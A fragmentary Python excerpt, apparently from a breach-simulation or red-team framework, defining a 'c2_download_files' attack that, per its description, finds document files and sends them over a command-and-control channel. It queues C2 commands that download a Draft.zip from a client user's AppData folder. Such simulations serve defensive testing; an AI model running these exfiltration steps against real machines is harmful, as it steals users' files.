...
class C2DownloadFilesAttackOptions(C2AttackOptions):
...
class C2DownloadFilesAttack(C2Attack):
    info = AttackInfo(
        name="c2_download_files",
        description="Finds and sends doc related files over the C&C channel")
    options_class = C2DownloadFilesAttackOptions
    handler = None

    def run(self):
        with self.check_printed("/root/Draft.zip"):
    ...
    def _append_command(self):
        self.commands.extend([
            ...
            "exit",
            "download \"C:\\Users\\client1\\AppData\\Roaming\\Draft.zip\"",
            "background"
        ])
